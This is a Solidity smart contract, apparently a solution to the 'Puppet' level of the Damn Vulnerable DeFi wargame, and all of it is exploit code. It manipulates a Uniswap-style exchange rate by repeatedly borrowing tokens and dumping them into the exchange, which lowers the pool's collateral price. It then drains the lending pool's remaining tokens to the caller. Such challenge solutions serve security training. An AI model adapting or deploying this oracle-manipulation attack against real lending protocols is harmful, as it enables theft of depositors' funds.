// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";
import "./PuppetPool.sol";

contract HackPuppetPool {
    constructor(PuppetPool _puppetPool, address _uniswap, DamnValuableToken _token) payable {
        while (address(this).balance < _puppetPool.calculateDepositRequired(_token.balanceOf(address(_puppetPool)))) {
            uint256 amountPossible = (address(this).balance / 3 * 10 ** 18) / (2 * (_uniswap.balance * (10 ** 18) / _token.balanceOf(_uniswap)));
            _puppetPool.borrow{value: address(this).balance}(amountPossible, address(this));
            _token.approve(_uniswap, amountPossible);
            (bool success,) = _uniswap.call(abi.encodeWithSignature("tokenToEthSwapInput(uint256,uint256,uint256)", amountPossible, 1, block.timestamp + 1));
            require(success);
        }
        uint256 rest = _token.balanceOf(address(_puppetPool));
        _puppetPool.borrow{value: address(this).balance}(rest, msg.sender);
        (bool lastSuccess,) = _uniswap.call{value: address(this).balance}(abi.encodeWithSignature("ethToTokenSwapInput(uint256,uint256)", 1, block.timestamp + 1));
        require(lastSuccess);
        _token.transfer(msg.sender, _token.balanceOf(address(this)));
   }
}